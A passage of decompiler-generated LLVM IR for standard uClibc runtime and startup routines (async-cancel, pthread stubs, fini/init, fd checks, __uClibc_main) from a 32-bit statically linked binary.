  store i32 %v2_8062f8f, i32* @ebx, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_8062f57, { 0, 3, 2, 1 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1 }
  uselistorder i32 240, { 0, 1, 5, 2, 3, 4 }
  uselistorder label %dec_label_pc_8062f8f, { 1, 0, 2 }
}

define i32 @__libc_enable_asynccancel(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp9, i32* %stack_var_-12, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8062f92 = load i32, i32* @ebx, align 4
  store i32 %v0_8062f92, i32* %stack_var_-4, align 4
  %storemerge.pre = load i32, i32* inttoptr (i32 132 to i32*), align 4
  br label %dec_label_pc_8062f9d

dec_label_pc_8062f9d:                             ; preds = %dec_label_pc_8062fa6, %entry
  %v0_8062fa6 = phi i32 [ %storemerge.pre, %entry ], [ %v0_8062fa8, %dec_label_pc_8062fa6 ]
  store i32 %v0_8062fa6, i32* %ebx.global-to-local, align 4
  %v1_8062f9f = or i32 %v0_8062fa6, 2
  store i32 %v1_8062f9f, i32* %edx.global-to-local, align 4
  %v12_8062fa2 = icmp eq i32 %v1_8062f9f, %v0_8062fa6
  br i1 %v12_8062fa2, label %dec_label_pc_8062fe0.loopexit, label %dec_label_pc_8062fa6

dec_label_pc_8062fa6:                             ; preds = %dec_label_pc_8062f9d
  %v0_8062fa8 = load i32, i32* inttoptr (i32 132 to i32*), align 4
  %v13_8062fa8 = icmp eq i32 %v0_8062fa6, %v0_8062fa8
  %v20_8062fa8 = select i1 %v13_8062fa8, i32 %v1_8062f9f, i32 %v0_8062fa8
  store i32 %v20_8062fa8, i32* inttoptr (i32 132 to i32*), align 4
  %v1_8062fb1 = load i32, i32* %ebx.global-to-local, align 4
  %v12_8062fb1 = icmp eq i32 %v0_8062fa8, %v1_8062fb1
  br i1 %v12_8062fb1, label %dec_label_pc_8062fb9, label %dec_label_pc_8062f9d

dec_label_pc_8062fb9:                             ; preds = %dec_label_pc_8062fa6
  %v0_8062fb9 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062fb9 = and i32 %v0_8062fb9, -69
  store i32 %v1_8062fb9, i32* %edx.global-to-local, align 4
  %v9_8062fbc = icmp eq i32 %v1_8062fb9, 10
  %v1_8062fbf = icmp eq i1 %v9_8062fbc, false
  br i1 %v1_8062fbf, label %dec_label_pc_8062fe0, label %dec_label_pc_8062fc1

dec_label_pc_8062fc1:                             ; preds = %dec_label_pc_8062fb9
  store i32 -1, i32* inttoptr (i32 544 to i32*), align 32
  %v0_8062fcc = load i32, i32* inttoptr (i32 132 to i32*), align 4
  %v1_8062fcc = or i32 %v0_8062fcc, 16
  store i32 %v1_8062fcc, i32* inttoptr (i32 132 to i32*), align 4
  %v1_8062fdb = call i32 @__libc_errno(i32 %v0_8062f92)
  %v2_8062fe0.pre = load i32, i32* %stack_var_-12, align 4
  %v0_8062fe1.pre = load i32, i32* %ebx.global-to-local, align 4
  %v2_8062fe4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8062fe0

dec_label_pc_8062fe0.loopexit:                    ; preds = %dec_label_pc_8062f9d
  br label %dec_label_pc_8062fe0

dec_label_pc_8062fe0:                             ; preds = %dec_label_pc_8062fe0.loopexit, %dec_label_pc_8062fb9, %dec_label_pc_8062fc1
  %v2_8062fe4 = phi i32 [ %v0_8062f92, %dec_label_pc_8062fe0.loopexit ], [ %v0_8062f92, %dec_label_pc_8062fb9 ], [ %v2_8062fe4.pre, %dec_label_pc_8062fc1 ]
  %v0_8062fe1 = phi i32 [ %v0_8062fa6, %dec_label_pc_8062fe0.loopexit ], [ %v0_8062fa8, %dec_label_pc_8062fb9 ], [ %v0_8062fe1.pre, %dec_label_pc_8062fc1 ]
  %v2_8062fe0 = phi i32 [ %tmp9, %dec_label_pc_8062fe0.loopexit ], [ %tmp9, %dec_label_pc_8062fb9 ], [ %v2_8062fe0.pre, %dec_label_pc_8062fc1 ]
  store i32 %v2_8062fe0, i32* %edx.global-to-local, align 4
  store i32 %v2_8062fe4, i32* @ebx, align 4
  ret i32 %v0_8062fe1

; uselistorder directives
  uselistorder i32 %v0_8062fa8, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v1_8062f9f, { 1, 0, 2 }
  uselistorder i32 %v0_8062fa6, { 0, 2, 1, 4, 3 }
  uselistorder i32* inttoptr (i32 544 to i32*), { 1, 0 }
  uselistorder i32* inttoptr (i32 132 to i32*), { 5, 6, 7, 8, 0, 9, 10, 11, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_8062fe0, { 0, 2, 1 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  store i32 %arg3, i32* @edx, align 4
  %v2_8062ffc = add i32 %tmp3, 4
  %v3_8062ffc = inttoptr i32 %v2_8062ffc to i32*
  store i32 %arg3, i32* %v3_8062ffc, align 4
  ret i32 %tmp3

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v4_8063000 = icmp eq i32 %arg2, 0
  store i32 %tmp1, i32* @edx, align 4
  br i1 %v4_8063000, label %dec_label_pc_8063016, label %dec_label_pc_806300b

dec_label_pc_806300b:                             ; preds = %entry
  %v1_806300b = add i32 %tmp1, 4
  %v2_806300b = inttoptr i32 %v1_806300b to i32*
  %v3_806300b = load i32, i32* %v2_806300b, align 4
  %v2_8063012 = load i32, i32* %arg1, align 4
  store i32 %v2_8063012, i32* @ecx, align 4
  call void @__pseudo_branch(i32 %v2_8063012)
  br label %dec_label_pc_8063016

dec_label_pc_8063016:                             ; preds = %entry, %dec_label_pc_806300b
  %.0 = phi i32 [ undef, %entry ], [ %v3_806300b, %dec_label_pc_806300b ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %tmp1, { 1, 0 }
  uselistorder i32 undef, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8063016, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8063017 = load i32, i32* @ebx, align 4
  store i32 %v0_8063017, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80717f0.1652 to i32), i32 -134682608), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80717f0.1652 to i32), i32 -134682608), i32 2), i32 0), label %dec_label_pc_806302b, label %dec_label_pc_8063038

dec_label_pc_806302b:                             ; preds = %entry, %dec_label_pc_806302b
  %v1_80630328 = phi i32 [ %v1_8063032, %dec_label_pc_806302b ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80717f0.1652 to i32), i32 -134682608), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_8063032.1653 to i32), i32* %stack_var_-16, align 4
  %v5_806302b = mul i32 %v1_80630328, 4
  %v6_806302b = add i32 %v5_806302b, ptrtoint (i32* @global_var_80717f0.1652 to i32)
  %v7_806302b = inttoptr i32 %v6_806302b to i32*
  %v8_806302b = load i32, i32* %v7_806302b, align 4
  call void @__pseudo_call(i32 %v8_806302b)
  %v0_8063032.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063032 = add i32 %v0_8063032.pre, -1
  store i32 %v1_8063032, i32* %ebx.global-to-local, align 4
  %v10_8063033 = icmp eq i32 %v0_8063032.pre, 0
  %v1_8063036 = icmp eq i1 %v10_8063033, false
  br i1 %v1_8063036, label %dec_label_pc_806302b, label %dec_label_pc_8063038

dec_label_pc_8063038:                             ; preds = %dec_label_pc_806302b, %entry
  %v0_8063038 = load i32, i32* @global_var_80782cc.1654, align 4
  %v1_806303d = icmp eq i32 %v0_8063038, 0
  br i1 %v1_806303d, label %dec_label_pc_8063043, label %dec_label_pc_8063041

dec_label_pc_8063041:                             ; preds = %dec_label_pc_8063038
  %v0_8063041 = load i32, i32* %stack_var_-16, align 4
  %v1_8063041 = call i32 @__libc_errno(i32 %v0_8063041)
  br label %dec_label_pc_8063043

dec_label_pc_8063043:                             ; preds = %dec_label_pc_8063041, %dec_label_pc_8063038
  %v0_8063043 = load i32, i32* @global_var_80782d0.1655, align 16
  %v1_8063049 = icmp eq i32 %v0_8063043, 0
  br i1 %v1_8063049, label %dec_label_pc_8063052, label %dec_label_pc_806304d

dec_label_pc_806304d:                             ; preds = %dec_label_pc_8063043
  %v2_806304d = load i32, i32* %stack_var_-16, align 4
  %v1_8063050 = call i32 @__libc_errno(i32 %v2_806304d)
  br label %dec_label_pc_8063052

dec_label_pc_8063052:                             ; preds = %dec_label_pc_806304d, %dec_label_pc_8063043
  %v2_8063052 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_8063052

; uselistorder directives
  uselistorder i32 %v1_8063032, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_806302b, { 1, 0 }
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8063056 = load i32, i32* @esi, align 4
  %v0_8063057 = load i32, i32* @eax, align 4
  store i32 %v0_8063057, i32* @esi, align 4
  %v0_8063059 = load i32, i32* @ebx, align 4
  store i32 %v0_8063059, i32* %stack_var_-8, align 4
  %v0_806305a = load i32, i32* @edx, align 4
  store i32 %v0_806305a, i32* @ebx, align 4
  %v4_8063062 = call i32 @__libc_fcntl(i32 %v0_8063057, i32 1, i32 %tmp6)
  %v1_806306a = add i32 %v4_8063062, 1
  %v8_806306a = icmp eq i32 %v1_806306a, 0
  store i32 %v1_806306a, i32* @eax, align 4
  %v1_806306b = icmp eq i1 %v8_806306a, false
  br i1 %v1_806306b, label %dec_label_pc_8063086, label %dec_label_pc_806306d

dec_label_pc_806306d:                             ; preds = %entry
  %v0_806306f = load i32, i32* @ebx, align 4
  %v3_8063075 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_806ff80.1656 to i32), i32 %v0_806306f)
  %v1_806307d = load i32, i32* @esi, align 4
  %v12_806307d = icmp eq i32 %v3_8063075, %v1_806307d
  br i1 %v12_806307d, label %dec_label_pc_8063086, label %dec_label_pc_8063081

dec_label_pc_8063081:                             ; preds = %dec_label_pc_806306d
  %v0_8063081 = call i32 @abort()
  br label %dec_label_pc_8063086

dec_label_pc_8063086:                             ; preds = %dec_label_pc_806306d, %entry, %dec_label_pc_8063081
  %v2_8063086 = load i32, i32* %stack_var_-12, align 4
  %v2_8063087 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8063087, i32* @ebx, align 4
  store i32 %v0_8063056, i32* @esi, align 4
  ret i32 %v2_8063086

; uselistorder directives
  uselistorder label %dec_label_pc_8063086, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_806308d = load i32, i32* @global_var_80782c8.1657, align 8
  %v1_806308d = icmp eq i32 %v0_806308d, 0
  %v1_8063094 = icmp eq i1 %v1_806308d, false
  br i1 %v1_8063094, label %entry.dec_label_pc_80630b6_crit_edge, label %dec_label_pc_8063096

entry.dec_label_pc_80630b6_crit_edge:             ; preds = %entry
  %v0_80630b9.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80630b6

dec_label_pc_8063096:                             ; preds = %entry
  store i32 4096, i32* @global_var_80782c8.1657, align 8
  %v0_80630a0 = call i32 @__pthread_initialize_minimal()
  %v0_80630b1 = call i32 @_stdio_init()
  br label %dec_label_pc_80630b6

dec_label_pc_80630b6:                             ; preds = %entry.dec_label_pc_80630b6_crit_edge, %dec_label_pc_8063096
  %v0_80630b9 = phi i32 [ %v0_80630b9.pre, %entry.dec_label_pc_80630b6_crit_edge ], [ %v0_80630b1, %dec_label_pc_8063096 ]
  ret i32 %v0_80630b9

; uselistorder directives
  uselistorder label %dec_label_pc_80630b6, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  store i32 %tmp31, i32* %ecx.global-to-local, align 4
  store i32 %arg4, i32* @ebp, align 4
  store i32 %arg7, i32* @global_var_80782c0.1658, align 64
  %v2_80630ec = mul i32 %arg2, 4
  store i32 %v2_80630ec, i32* %edx.global-to-local, align 4
  store i32 %arg6, i32* @global_var_80782d0.1655, align 16
  %v2_80630f4 = add i32 %v2_80630ec, 4
  %v3_80630f4 = add i32 %v2_80630f4, %tmp31
  store i32 %v3_80630f4, i32* %eax.global-to-local, align 4
  %v3_80630f8 = load i32, i32* %arg3, align 4
  %v14_80630f8 = icmp eq i32 %v3_80630f4, %v3_80630f8
  store i32 %v3_80630f4, i32* @global_var_80782c4.1639, align 4
  %v1_80630ff = icmp eq i1 %v14_80630f8, false
  br i1 %v1_80630ff, label %dec_label_pc_806310a, label %dec_label_pc_8063101

dec_label_pc_8063101:                             ; preds = %entry
  %v2_8063103 = add i32 %tmp31, %v2_80630ec
  store i32 %v2_8063103, i32* %eax.global-to-local, align 4
  store i32 %v2_8063103, i32* @global_var_80782c4.1639, align 4
  br label %dec_label_pc_806310a

dec_label_pc_806310a:                             ; preds = %entry, %dec_label_pc_8063101
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_8063111 = ptrtoint i32* %stack_var_-180 to i32
  %tmp46 = bitcast i32* %stack_var_-180 to i8*
  store i32 %v2_8063111, i32* @edi, align 4
  %v5_8063115 = call i8* @_memset(i8* %tmp46, i32 0, i32 30)
  %v6_8063115 = ptrtoint i8* %v5_8063115 to i32
  store i32 %v6_8063115, i32* %ecx.global-to-local, align 4
  %v0_8063117 = load i32, i32* @global_var_80782c4.1639, align 4
  br label %dec_label_pc_8063121

dec_label_pc_8063121:                             ; preds = %dec_label_pc_8063121, %dec_label_pc_806310a
  %storemerge = phi i32 [ %v0_8063117, %dec_label_pc_806310a ], [ %v1_806311e, %dec_label_pc_8063121 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8063121 = inttoptr i32 %storemerge to i32*
  %v2_8063121 = load i32, i32* %v1_8063121, align 4
  %v3_8063121 = icmp eq i32 %v2_8063121, 0
  %v1_8063124 = icmp eq i1 %v3_8063121, false
  %v1_806311e = add i32 %storemerge, 4
  br i1 %v1_8063124, label %dec_label_pc_8063121, label %dec_label_pc_8063126

dec_label_pc_8063126:                             ; preds = %dec_label_pc_8063121
  store i32 %v1_806311e, i32* %ecx.global-to-local, align 4
  store i32 %v2_8063111, i32* %edx.global-to-local, align 4
  %v1_80631402 = inttoptr i32 %v1_806311e to i32*
  %v2_80631403 = load i32, i32* %v1_80631402, align 4
  %v3_80631404 = icmp eq i32 %v2_80631403, 0
  %v1_806314311 = icmp eq i1 %v3_80631404, false
  br i1 %v1_806314311, label %dec_label_pc_806312f.lr.ph, label %dec_label_pc_8063145

dec_label_pc_806312f.lr.ph:                       ; preds = %dec_label_pc_8063126
  %v7_806313b = load i1, i1* @df, align 1
  %v8_806313b = select i1 %v7_806313b, i32 -4, i32 4
  br label %dec_label_pc_806312f

dec_label_pc_806312f:                             ; preds = %dec_label_pc_806312f.lr.ph, %dec_label_pc_806313d
  %v1_8063136 = phi i32 [ %v2_80631403, %dec_label_pc_806312f.lr.ph ], [ %v2_8063140, %dec_label_pc_806313d ]
  %v0_8063139 = phi i32 [ %v1_806311e, %dec_label_pc_806312f.lr.ph ], [ %v1_806313d, %dec_label_pc_806313d ]
  store i32 %v1_8063136, i32* %eax.global-to-local, align 4
  %v6_8063134 = icmp ugt i32 %v1_8063136, 14
  br i1 %v6_8063134, label %dec_label_pc_806313d, label %dec_label_pc_8063136

dec_label_pc_8063136:                             ; preds = %dec_label_pc_806312f
  %v1_806312f = inttoptr i32 %v0_8063139 to i32*
  %v0_8063136 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063136 = mul i32 %v1_8063136, 8
  %v3_8063136 = add i32 %v0_8063136, %v2_8063136
  store i32 %v3_8063136, i32* %edi.global-to-local, align 4
  store i32 %v0_8063139, i32* %esi.global-to-local, align 4
  %v2_806313b = load i32, i32* %v1_806312f, align 4
  %v4_806313b = inttoptr i32 %v3_8063136 to i32*
  store i32 %v2_806313b, i32* %v4_806313b, align 4
  %v5_806313b = load i32, i32* %edi.global-to-local, align 4
  %v6_806313b = load i32, i32* %esi.global-to-local, align 4
  %v9_806313b = add i32 %v5_806313b, %v8_806313b
  %v10_806313b = add i32 %v6_806313b, %v8_806313b
  store i32 %v9_806313b, i32* %edi.global-to-local, align 4
  store i32 %v10_806313b, i32* %esi.global-to-local, align 4
  %v1_806313c = inttoptr i32 %v10_806313b to i32*
  %v2_806313c = load i32, i32* %v1_806313c, align 4
  %v4_806313c = inttoptr i32 %v9_806313b to i32*
  store i32 %v2_806313c, i32* %v4_806313c, align 4
  %v5_806313c = load i32, i32* %edi.global-to-local, align 4
  %v6_806313c = load i32, i32* %esi.global-to-local, align 4
  %v9_806313c = add i32 %v5_806313c, %v8_806313b
  %v10_806313c = add i32 %v6_806313c, %v8_806313b
  store i32 %v9_806313c, i32* @edi, align 4
  store i32 %v10_806313c, i32* @esi, align 4
  %v0_806313d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_806313d

dec_label_pc_806313d:                             ; preds = %dec_label_pc_806312f, %dec_label_pc_8063136
  %v0_806313d = phi i32 [ %v0_8063139, %dec_label_pc_806312f ], [ %v0_806313d.pre, %dec_label_pc_8063136 ]
  %v1_806313d = add i32 %v0_806313d, 8
  store i32 %v1_806313d, i32* %ecx.global-to-local, align 4
  %v1_8063140 = inttoptr i32 %v1_806313d to i32*
  %v2_8063140 = load i32, i32* %v1_8063140, align 4
  %v3_8063140 = icmp eq i32 %v2_8063140, 0
  %v1_8063143 = icmp eq i1 %v3_8063140, false
  br i1 %v1_8063143, label %dec_label_pc_806312f, label %dec_label_pc_8063140.dec_label_pc_8063145_crit_edge

dec_label_pc_8063140.dec_label_pc_8063145_crit_edge: ; preds = %dec_label_pc_806313d
  br label %dec_label_pc_8063145

dec_label_pc_8063145:                             ; preds = %dec_label_pc_8063140.dec_label_pc_8063145_crit_edge, %dec_label_pc_8063126
  store i32 %v2_8063111, i32* @eax, align 4
  %v0_8063149 = call i32 @_dl_aux_init()
  store i32 %v0_8063149, i32* @eax, align 4
  %v0_806314e = call i32 @__GI___uClibc_init()
  store i32 4096, i32* %edx.global-to-local, align 4
  %v1_806315c = icmp eq i32 %tmp27, 0
  %v3_806315e = select i1 %v1_806315c, i32 4096, i32 %tmp27
  store i32 %v3_806315e, i32* %eax.global-to-local, align 4
  %v13_8063161 = icmp eq i32 %tmp26, -1
  store i32 %v3_806315e, i32* @global_var_80782c8.1657, align 8
  %v1_806316b = icmp eq i1 %v13_8063161, false
  br i1 %v1_806316b, label %dec_label_pc_8063196, label %dec_label_pc_806316d

dec_label_pc_806316d:                             ; preds = %dec_label_pc_8063145
  %v0_806316d = call i32 @getuid()
  store i32 %v0_806316d, i32* %eax.global-to-local, align 4
  store i32 %v0_806316d, i32* @ebx, align 4
  %v0_8063174 = call i32 @geteuid()
  store i32 %v0_8063174, i32* %eax.global-to-local, align 4
  %v0_8063179 = load i32, i32* @ebx, align 4
  %v12_8063179 = icmp eq i32 %v0_8063179, %v0_8063174
  %v1_806317b = icmp eq i1 %v12_8063179, false
  br i1 %v1_806317b, label %dec_label_pc_80631ac, label %dec_label_pc_806317d

dec_label_pc_806317d:                             ; preds = %dec_label_pc_806316d
  %v0_806317d = call i32 @getgid()
  store i32 %v0_806317d, i32* %eax.global-to-local, align 4
  store i32 %v0_806317d, i32* @ebx, align 4
  %v0_8063184 = call i32 @getegid()
  store i32 %v0_8063184, i32* %eax.global-to-local, align 4
  %v0_8063189 = load i32, i32* @ebx, align 4
  %v12_8063189 = icmp eq i32 %v0_8063189, %v0_8063184
  %v1_806318b = icmp eq i1 %v12_8063189, false
  br i1 %v1_806318b, label %dec_label_pc_80631ac, label %dec_label_pc_806318d.thread

dec_label_pc_806318d.thread:                      ; preds = %dec_label_pc_806317d
  store i32 %tmp26, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80631d6

dec_label_pc_8063196:                             ; preds = %dec_label_pc_8063145
  store i32 %tmp26, i32* %eax.global-to-local, align 4
  %v15_8063196 = icmp eq i32 %tmp26, %tmp25
  %v1_806319a = icmp eq i1 %v15_8063196, false
  br i1 %v1_806319a, label %dec_label_pc_80631ac, label %dec_label_pc_806319c

dec_label_pc_806319c:                             ; preds = %dec_label_pc_8063196
  store i32 %tmp24, i32* %eax.global-to-local, align 4
  %v15_80631a3 = icmp eq i32 %tmp24, %tmp23
  br i1 %v15_80631a3, label %dec_label_pc_80631d6, label %dec_label_pc_80631ac

dec_label_pc_80631ac:                             ; preds = %dec_label_pc_806319c, %dec_label_pc_8063196, %dec_label_pc_806317d, %dec_label_pc_806316d
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_80631b3 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_80631c2 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_80631d1 = call i32 @__check_one_fd()
  store i32 %v0_80631d1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80631d6

dec_label_pc_80631d6:                             ; preds = %dec_label_pc_806318d.thread, %dec_label_pc_806319c, %dec_label_pc_80631ac
  store i32 %tmp31, i32* %edx.global-to-local, align 4
  %v2_80631dd = load i32, i32* %arg3, align 4
  store i32 %v2_80631dd, i32* %eax.global-to-local, align 4
  store i32 %v2_80631dd, i32* inttoptr (i32 134683372 to i32*), align 4
  %v2_80631e4 = load i32, i32* %arg3, align 4
  store i32 %v2_80631e4, i32* %ebx.global-to-local, align 4
  %v1_80631e6 = icmp eq i32 %v2_80631e4, 0
  br i1 %v1_80631e6, label %dec_label_pc_8063215, label %dec_label_pc_80631ea

dec_label_pc_80631ea:                             ; preds = %dec_label_pc_80631d6
  %v0_80631ea = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_80631ea, i32* %stack_var_-208, align 4
  store i32 %v2_80631e4, i32* inttoptr (i32 134683380 to i32*), align 4
  %v0_80631f4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80631f4 = inttoptr i32 %v0_80631f4 to i32*
  %v2_80631f4 = load i32, i32* %v1_80631f4, align 4
  %v4_80631f6 = inttoptr i32 %v2_80631f4 to i8*
  %v5_80631f6 = call i32 @strrchr(i8* %v4_80631f6, i32 47, i32 %v0_80631ea, i32 %v0_80631ea)
  %v1_8063207 = add i32 %v5_80631f6, 1
  store i32 %v1_8063207, i32* %eax.global-to-local, align 4
  store i32 %v1_8063207, i32* bitcast (i32** @global_var_8071af0.1659 to i32*), align 16
  br label %dec_label_pc_8063215

dec_label_pc_8063215:                             ; preds = %dec_label_pc_80631d6, %dec_label_pc_80631ea
  store i32 %arg5, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80717f0.1652 to i32), i32 -134682608), i32 2), i32* %esi.global-to-local, align 4
  store i32 %arg5, i32* @global_var_80782cc.1654, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80717f0.1652 to i32), i32 -134682608), i32 2), i32 0), label %dec_label_pc_8063233, label %dec_label_pc_806323f

dec_label_pc_8063233:                             ; preds = %dec_label_pc_8063215, %dec_label_pc_8063233
  %v4_806323348 = phi i32 [ %v1_806323a, %dec_label_pc_8063233 ], [ 0, %dec_label_pc_8063215 ]
  store i32 ptrtoint (i32* @global_var_806323a.1660 to i32), i32* %stack_var_-208, align 4
  %v5_8063233 = mul i32 %v4_806323348, 4
  %v6_8063233 = add i32 %v5_8063233, ptrtoint (i32* @global_var_80717f0.1652 to i32)
  %v7_8063233 = inttoptr i32 %v6_8063233 to i32*
  %v8_8063233 = load i32, i32* %v7_8063233, align 4
  call void @__pseudo_call(i32 %v8_8063233)
  %v0_806323a = load i32, i32* %ebx.global-to-local, align 4
  %v1_806323a = add i32 %v0_806323a, 1
  store i32 %v1_806323a, i32* %ebx.global-to-local, align 4
  %v1_806323b.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_806323b = icmp ult i32 %v1_806323a, %v1_806323b.pre
  br i1 %v7_806323b, label %dec_label_pc_8063233, label %dec_label_pc_806323f

dec_label_pc_806323f:                             ; preds = %dec_label_pc_8063233, %dec_label_pc_8063215
  store i32 134623813, i32* %stack_var_-208, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80717f0.1652 to i32), i32 -134682608), i32 2), i32* @esi, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80717f0.1652 to i32), i32 -134682608), i32 2), i32 0), label %dec_label_pc_8063257, label %dec_label_pc_8063263

dec_label_pc_8063257:                             ; preds = %dec_label_pc_806323f, %dec_label_pc_8063257
  %v4_806325747 = phi i32 [ %v1_806325e, %dec_label_pc_8063257 ], [ 0, %dec_label_pc_806323f ]
  store i32 ptrtoint (i32* @global_var_806325e.1661 to i32), i32* %stack_var_-208, align 4
  %v5_8063257 = mul i32 %v4_806325747, 4
  %v6_8063257 = add i32 %v5_8063257, ptrtoint (i32* @global_var_80717f0.1652 to i32)
  %v7_8063257 = inttoptr i32 %v6_8063257 to i32*
  %v8_8063257 = load i32, i32* %v7_8063257, align 4
  call void @__pseudo_call(i32 %v8_8063257)
  %v0_806325e = load i32, i32* @ebx, align 4
  %v1_806325e = add i32 %v0_806325e, 1
  store i32 %v1_806325e, i32* @ebx, align 4
  %v1_806325f.pre = load i32, i32* @esi, align 4
  %v7_806325f = icmp ult i32 %v1_806325e, %v1_806325f.pre
  br i1 %v7_806325f, label %dec_label_pc_8063257, label %dec_label_pc_8063263

dec_label_pc_8063263:                             ; preds = %dec_label_pc_8063257, %dec_label_pc_806323f
  store i32 134609220, i32* %eax.global-to-local, align 4
  %v0_806326c = load i32, i32* %stack_var_-208, align 4
  %v1_806326c = call i32 @__GI___errno_location(i32 %v0_806326c)
  %v1_8063271 = inttoptr i32 %v1_806326c to i32*
  store i32 0, i32* %v1_8063271, align 4
  %v2_806328b = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_806328b, i32* %eax.global-to-local, align 4
  %v1_8063296 = call i32 @_setjmp(i32 %v2_806328b)
  store i32 %v1_8063296, i32* %eax.global-to-local, align 4
  %v1_806329e = icmp eq i32 %v1_8063296, 0
  %v1_80632a0 = icmp eq i1 %v1_806329e, false
  br i1 %v1_80632a0, label %dec_label_pc_80632ec, label %dec_label_pc_80632a2

dec_label_pc_80632a2:                             ; preds = %dec_label_pc_8063263
  store i32 %v2_806328b, i32* %eax.global-to-local, align 4
  store i32 %v2_806328b, i32* inttoptr (i32 128 to i32*), align 128
  store i32 %v2_806328b, i32* %stack_var_-208, align 4
  store i32 134623973, i32* %stack_var_-224, align 4
  call void @__pseudo_call(i32 %arg1)
  store i32 %v2_806328b, i32* %edx.global-to-local, align 4
  %v1_8063310 = call i32 @__GI_exit(i32 %v2_806328b)
  store i32 %v1_8063310, i32* %eax.global-to-local, align 4
  ret i32 %v1_8063310

dec_label_pc_80632ec:                             ; preds = %dec_label_pc_8063263
  %v0_80632ec = load i32, i32* %stack_var_-224, align 4
  %v1_80632ec = call i32 @__libc_errno(i32 %v0_80632ec)
  store i32 %v1_80632ec, i32* %eax.global-to-local, align 4
  call void @llvm.trap()
  unreachable

; uselistorder directives
  uselistorder i32 %v1_806325e, { 1, 2, 0 }
  uselistorder i32 %v1_806323a, { 1, 2, 0 }
  uselistorder i32 %v2_8063140, { 1, 0 }
  uselistorder i32 %v1_806313d, { 1, 2, 0 }
